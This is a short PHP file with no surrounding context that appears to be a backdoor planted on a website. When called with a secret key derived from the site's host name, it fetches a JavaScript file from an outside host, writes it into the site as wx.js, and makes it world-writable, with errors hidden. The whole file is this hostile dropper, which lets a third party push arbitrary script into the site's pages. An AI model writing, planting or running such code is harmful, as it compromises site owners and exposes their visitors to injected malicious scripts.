<?php
$domain=md5($_SERVER['HTTP_HOST']."123");
$id=$_GET['id'];
$w=$_GET['key'];
if($w!=$domain || empty($id)){
	exit;
}
$url='http://zm.hr368.com/wx/'.$id.'.js';
$staring=ReadFiletext($url);
WriteFiletext_n('wx.js',$staring);
function WriteFiletext_n($filepath,$string){
	$fp=@fopen($filepath,"w");
	@fputs($fp,$string);
	@fclose($fp);
	if(empty($public_r[filechmod]))
	{
		@chmod($filepath,0777);
	}
}
function ReadFiletext($filepath){
	$filepath=trim($filepath);
	
	$ishttp=0;
	$htmlfp=@fopen($filepath,"r");
	while($data=@fread($htmlfp,500000))
	 {
			$string.=$data;
	}
	@fclose($htmlfp);
	return $string;
}
?>